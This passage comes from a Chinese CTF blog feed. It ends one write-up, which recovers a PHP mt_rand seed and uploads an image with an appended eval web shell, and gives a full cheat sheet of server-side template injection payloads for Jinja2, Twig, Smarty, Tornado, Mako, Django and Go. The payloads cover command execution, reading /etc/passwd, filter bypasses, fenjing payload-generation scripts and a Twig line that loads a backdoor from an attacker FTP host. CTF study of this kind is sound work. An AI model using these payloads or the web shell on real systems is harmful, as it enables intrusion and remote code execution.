class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>))) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) !== False) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="number">0</span>] !== <span class="number">100</span> || <span class="variable">$info</span>[<span class="number">1</span>] !== <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$uploadDir</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ready</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ready</span> === <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>] = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[0]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">225</span>; <span class="variable">$i</span>++) <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[226]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[227]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[228]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> === (<span class="keyword">string</span>)<span class="variable">$_SESSION</span>[<span class="string">&#x27;secretKey&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="构造伪随机数"><a href="#构造伪随机数" class="headerlink" title="构造伪随机数"></a>构造伪随机数</h2><p>一开始需要构造 key 才能上传题目,开始时考虑使用专门进行种子爆破的 php_mt_seed 工具<br>后来百度发现无需暴力破解就可以计算原始种子<br><a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br>前提要求是给定间隔 227 个值的两个 mt_rand()输出结果，例如第 1 个和第 228 个 mt_rand()的输出结果<br>下载 mt_rand-reverse-master<br><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a><br>传参 127.0.0.1:100&#x2F;upload.php?ready&#x3D;1</p><pre><code>412630690&lt;br&gt;1046894031&lt;br&gt;1961239210&lt;br&gt;2006731948&lt;br&gt;Cookie:PHPSESSID=o065m8ssj0dakiv4iijtsp8sq6</code></pre><p>传第 0 个和第 227 个 mt_rand()值</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reverse_mt_rand.py <span class="number">412630690</span> <span class="number">1961239210</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>得到 key 值 1955787332</p><h2 id="构造绕过-PHP-文件上传"><a href="#构造绕过-PHP-文件上传" class="headerlink" title="构造绕过 PHP 文件上传"></a>构造绕过 PHP 文件上传</h2><p>使用文件名加点绕过,linux 在处理文件时会自动省略点号<br>内容用 js 语言&lt;script language&#x3D;”php”&gt;绕过<br>内容大小要求 100*50，使用 python 库 PIL 自动生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标上传的 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php/?ready=1&amp;key=1955787332&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o065m8ssj0dakiv4iijtsp8sq6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造图片（100x50），并在图片数据中嵌入恶意 PHP 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_with_payload</span>():</span><br><span class="line">    <span class="comment"># 创建一个 100x50 的空白图片</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">100</span>, <span class="number">50</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    img_byte_arr = BytesIO()</span><br><span class="line">    img.save(img_byte_arr, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP payload，嵌入到文件末尾</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图片数据和 payload 结合起来</span></span><br><span class="line">    img_data = img_byte_arr.getvalue() + payload</span><br><span class="line">    <span class="keyword">return</span> img_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造上传请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="comment"># 生成带有 payload 的图片</span></span><br><span class="line">    img_data = create_image_with_payload()</span><br><span class="line">    filename = <span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">    <span class="comment"># 构造文件参数</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, img_data, <span class="string">&quot;image/png&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求，上传文件</span></span><br><span class="line">    response = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出上传结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response status:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response body:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后访问 127.0.0.1:100&#x2F;uploads&#x2F;md5($_SERVER[‘REMOTE_ADDR’])&#x2F;shell.php 用蚁剑连接，密码为 cmd。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种ssti绕过及脚本</title>
      <link href="/posts/301c82e9.html"/>
      <url>/posts/301c82e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="判断网站类型"><a href="#判断网站类型" class="headerlink" title="判断网站类型"></a>判断网站类型</h1><h2 id="自己查找判断"><a href="#自己查找判断" class="headerlink" title="自己查找判断"></a>自己查找判断</h2><ul><li>在页面或者抓包回复里有时会泄露类型</li></ul><h2 id="在疑似-ssti-处注入-7-7"><a href="#在疑似-ssti-处注入-7-7" class="headerlink" title="在疑似 ssti 处注入 ${7*7}"></a>在疑似 ssti 处注入 ${7*7}</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="a-comment-b"><a href="#a-comment-b" class="headerlink" title="a{*comment*}b"></a>a{*comment*}b</h4><ul><li>ab -&gt; smarty</li></ul><h4 id="“z”-join-“ab”-z"><a href="#“z”-join-“ab”-z" class="headerlink" title="${“z”.join(“ab”)}z"></a>${“z”.join(“ab”)}z</h4><ul><li>zab -&gt; mako</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="7-‘7’"><a href="#7-‘7’" class="headerlink" title="{{7*‘7’}}"></a>{{7*‘7’}}</h4><ul><li>49 -&gt; Twig,smarty</li><li>7777777 -&gt; Jinja2 &#x2F;&#x2F;最常见的 ssti 类型</li></ul><h1 id="各种类型"><a href="#各种类型" class="headerlink" title="各种类型"></a>各种类型</h1><h2 id="Jinja2-python"><a href="#Jinja2-python" class="headerlink" title="Jinja2(python)"></a>Jinja2(python)</h2><h3 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h3><p>{{config}}</p><p>{{self.__dict__}}</p><p>{{url_for.__globals__}}</p><ul><li>{{url_for.__globals__[‘current_app’].config[‘FLAG’]}}</li></ul><p>{{datetime}}</p><pre><code>{{a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><p>一个特解，不一定有效，如果有效可以直接实现 RCE</p><h3 id="利用危险类"><a href="#利用危险类" class="headerlink" title="利用危险类"></a>利用危险类</h3><h4 id="利用进行注入"><a href="#利用进行注入" class="headerlink" title="利用&lt;class ‘object’&gt;进行注入"></a>利用&lt;class ‘object’&gt;进行注入</h4><p>用这些可访问对象作为开头</p><pre><code>[]&#39;&#39;&quot;&quot;()dictconfigrequest</code></pre><p>并用 base 或 mro 找到&lt;class ‘object’&gt;</p><pre><code>{{&#39;&#39;.\_\_class\_\_.\_\_bases\_\_[0]}} // &lt;class &#39;object&#39;&gt;{{&#39;&#39;.\_\_class\_\_.\_\_mro\_\_[2]}}// &lt;class &#39;object&#39;&gt;</code></pre><p>使用 subclasses 找到危险类</p><pre><code>{{&#39;&#39;.\_\_class\_\_.\_\_bases\_\_[0].\_\_subclasses\_\_()[?]}}</code></pre><p>在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。<br>这里使用 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:20440/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了<br>这里跑出来值为 127</p><pre><code>#read&amp;write{{ &#39;&#39;.__class__.__bases__[0].__subclasses__()[127](&#39;/etc/passwd&#39;).read() }}{{ &#39;&#39;.__class__.__bases__[0].__subclasses__()[127](&#39;&#39;, &#39;w&#39;).write(&#39;Hello&#39;) }}#RCE{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><h4 id="不使用"><a href="#不使用" class="headerlink" title="不使用&lt;class ‘object’&gt;"></a>不使用&lt;class ‘object’&gt;</h4><p>{{ request.__class__.__dict__ }}</p><ul><li>application</li><li>_load_form_data</li><li>on_json_loading_failed</li></ul><p>{{ config.__class__.__dict__}}</p><ul><li>__init__</li><li>from_envvar</li><li>from_pyfile</li><li>from_object</li><li>from_file</li><li>from_json</li><li>from_mapping</li><li>get_namespace</li><li>__repr__</li></ul><p>如果有回显出以下的全局对象</p><pre><code># Read file{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}# RCE{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ config.__class__.from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ (config|attr(&quot;__class__&quot;)).from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{% with a = request[&quot;application&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]() %} {{ a }} {% endwith %}</code></pre><h3 id="一点关于-ssti-的绕过"><a href="#一点关于-ssti-的绕过" class="headerlink" title="一点关于 ssti 的绕过"></a>一点关于 ssti 的绕过</h3><ul><li><strong>()即小括号是不可绕过的</strong></li></ul><h4 id="request-绕过-没被过滤全部可绕"><a href="#request-绕过-没被过滤全部可绕" class="headerlink" title="request 绕过(没被过滤全部可绕)"></a>request 绕过(没被过滤全部可绕)</h4><p>可以直接帮你绕过引号内的内容</p><pre><code>{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&amp;os=os&amp;command=cat /flag</code></pre><h4 id="chr-绕过-没被过滤全部可绕"><a href="#chr-绕过-没被过滤全部可绕" class="headerlink" title="chr 绕过(没被过滤全部可绕)"></a>chr 绕过(没被过滤全部可绕)</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__[&#39;__builtins__&#39;].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="过滤了双大括号"><a href="#过滤了双大括号" class="headerlink" title="过滤了双大括号{{}}"></a>过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线"></a>过滤了下划线</h4><p>{{()|select|string}} 结果为<br>&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了<br>{{(()|select|string)[?]}}</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="过滤了-和"><a href="#过滤了-和" class="headerlink" title="过滤了.和[]"></a>过滤了.和[]</h4><p>.过滤，用[]或者|attr()<br>.__class__.-&gt;[‘__class__‘]-&gt;|attr(‘__class__‘)<br>[]过滤了，用 pop 或者__getitem__</p><pre><code>{{&#39;&#39;.__class__.__mro__.__getitem__(0)}}</code></pre><p>[40]-&gt;pop(40)</p><h4 id="过滤了-class-bases-等关键字"><a href="#过滤了-class-bases-等关键字" class="headerlink" title="过滤了 class,bases 等关键字"></a>过滤了 class,bases 等关键字</h4><p>1.拼接</p><pre><code>{{&#39;&#39;[&#39;__cl&#39;&#39;ass__&#39;][&#39;__mr&#39;&#39;o__&#39;][1][&#39;__subc&#39;&#39;lasses__&#39;]()[140][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;popen&#39;](&#39;ls&#39;).read()}}</code></pre><p>2.倒置<br>.__class__. -&gt; ‘’[‘__ssalc__‘[::-1]]<br>3.格式化</p><pre><code>{%set ca=[&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)]}{%set ca=[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]%}{%set ca=&#39;%c%c%c%c%c%c%c%c%c&#39;%(95,95,99,108,97,115,115,95,95)%}</code></pre><p>这个没写脚本，用的有点少<br>4.编码绕过<br>（1）unicode<br>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到<br>（2）hex<br>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</p><h4 id="fenjing-一把梭"><a href="#fenjing-一把梭" class="headerlink" title="fenjing 一把梭"></a>fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本"><a href="#fenjing-python-破解脚本" class="headerlink" title="fenjing python 破解脚本"></a>fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig(PHP)"></a>Twig(PHP)</h2><ul><li><p>{{7*7}} &#x3D; 49</p></li><li><p>${7*7} &#x3D; ${7*7}</p></li><li><p>{{7*’7’}} &#x3D; 49</p></li><li><p>{{1&#x2F;0}} &#x3D; Error</p></li><li><p>{{foobar}} Nothing</p><pre><code>  #Get Info  {{_self}} #(Ref. to current application)  {{_self.env}}  {{dump(app)}}  {{app.request.server.all|join(&#39;,&#39;)}}  #File read  &quot;{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}&quot;@  #Exec code  {{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;whoami&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}  {{[&#39;id&#39;]|filter(&#39;system&#39;)}}  {{[&#39;cat\x20/etc/passwd&#39;]|filter(&#39;system&#39;)}}  {{[&#39;cat$IFS/etc/passwd&#39;]|filter(&#39;system&#39;)}}  {{[&#39;id&#39;,&quot;&quot;]|sort(&#39;system&#39;)}}  #Hide warnings and errors for automatic exploitation  {{[&quot;error_reporting&quot;, &quot;0&quot;]|sort(&quot;ini_set&quot;)}}</code></pre></li></ul><h2 id="Tornado-render-python"><a href="#Tornado-render-python" class="headerlink" title="Tornado render(python)"></a>Tornado render(python)</h2><ul><li><p>{{7*7}} &#x3D; 49</p></li><li><p>${7*7} &#x3D; ${7*7}</p></li><li><p>{{foobar}} &#x3D; Error</p></li><li><p>{{7*’7’}} &#x3D; 7777777</p><pre><code>  {% import os %}{{ os.popen(&quot;whoami&quot;).read() }}  {{handler.settings}}</code></pre></li></ul><h2 id="smarty-PHP"><a href="#smarty-PHP" class="headerlink" title="smarty(PHP)"></a>smarty(PHP)</h2><pre><code>{$smarty.version}{if system(&#39;ls&#39;)}{/if}{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name=&#39;rce(){};@eval($_POST[1]);function%0a%0a&#39;}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}{literal}alert(&#39;xss&#39;);{/literal}{if readfile(&#39;/flag&#39;)}{/if}</code></pre><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre><h2 id="Mako-python"><a href="#Mako-python" class="headerlink" title="Mako(python)"></a>Mako(python)</h2><pre><code>&lt;%import osx=os.popen(&#39;id&#39;).read()%&gt;${x}</code></pre><h2 id="GoLang"><a href="#GoLang" class="headerlink" title="GoLang"></a>GoLang</h2><p>在 Go 的模板引擎中，可以通过特定的有效负载来确认其使用情况：</p><ul><li><p>{{ . }}：显示数据结构输入。例如，如果具有 Password attribute 时， {{ .Password }} 可能会暴露它。</p></li><li><p>{{printf “%s” “ssti” }}：应显示字符串 “ssti”。</p></li><li><p>{{html “ssti”}}、 {{js “ssti”}}：这些有效负载应返回 “ssti” ，而不附加 “html” 或 “js”</p></li></ul><p>对于 Go 中通过 SSTI 的 RCE，可以调用对象方法。例如，如果提供的对象具有 System 方法执行命令，它可以被利用，例如 {{ .System “ls” 